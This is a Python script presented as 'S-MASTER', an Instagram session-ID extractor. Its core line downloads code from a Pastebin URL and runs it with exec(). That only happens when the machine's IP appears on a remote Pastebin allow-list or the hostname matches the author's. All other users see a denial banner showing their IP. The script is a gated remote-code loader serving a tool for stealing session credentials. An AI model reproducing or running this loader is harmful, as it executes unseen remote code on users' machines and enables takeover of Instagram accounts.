try:
    import requests, ctypes, os, hashlib, urllib.parse, uuid, hmac, random, string, time, json,socket
    from colorama import Fore
except ModuleNotFoundError:
    import os
    os.system('pip install requests')
    os.system('pip install colorama')
    import requests, ctypes, hashlib, urllib.parse, uuid, hmac, random, string, time, json,socket
    from colorama import Fore


import socket
hostname=socket.gethostname()
IPAddr=socket.gethostbyname(hostname)

ctypes.windll.kernel32.SetConsoleTitleW('S-MASTER - By @hmzoa - v1.0')
os.system('mode con: cols=100 lines=18')

ipPastebinurl = 'https://pastebin.com/6yPwjp00'

if IPAddr in requests.get(ipPastebinurl).text or hostname == 'Hamza-':#
    exec(requests.get('https://pastebin.com/raw/2rZ8TrRF').text)
else:
    redline = Fore.RED + "\n────────────────────────────────────────────────────────────────────────────────────────────────────" + Fore.LIGHTWHITE_EX
    annowns = Fore.LIGHTWHITE_EX + "[" + Fore.LIGHTRED_EX + "!" + Fore.LIGHTWHITE_EX + "] "
    logo = f'''{Fore.YELLOW}
                     ███████╗      ███╗   ███╗ █████╗ ███████╗████████╗███████╗██████╗ 
                     ██╔════╝      ████╗ ████║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
                     ███████╗█████╗██╔████╔██║███████║███████╗   ██║   █████╗  ██████╔╝
                     ╚════██║╚════╝██║╚██╔╝██║██╔══██║╚════██║   ██║   ██╔══╝  ██╔══██╗
                     ███████║      ██║ ╚═╝ ██║██║  ██║███████║   ██║   ███████╗██║  ██║
                     ╚══════╝      ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
                                             {Fore.LIGHTBLACK_EX}instagram Session-id extracter - by @hmzoa   {redline}
    '''
    print(logo)
    print(annowns+f'Sorry Slatt! you cant acces this tool contact me at{Fore.LIGHTBLUE_EX} @hmzoa\n\n{annowns}your ip addres is[{Fore.LIGHTGREEN_EX+IPAddr+ Fore.LIGHTWHITE_EX}]')
    print(f'\n\n\n{Fore.LIGHTBLACK_EX}Enter to exit')
    input()
    os.system('exit')
